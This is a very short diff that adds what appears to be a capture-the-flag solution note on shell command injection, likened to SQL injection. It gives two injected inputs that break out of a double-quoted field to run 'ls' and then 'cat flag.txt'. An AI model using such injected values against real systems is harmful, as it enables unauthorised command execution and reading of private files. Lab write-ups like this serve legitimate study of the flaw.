@@ -1,0 +1,8 @@
+The idea is same as SQLi:
+
+First enter(including double quote):
+" && ls && echo "
+
+then
+
+" && cat flag.txt && echo "
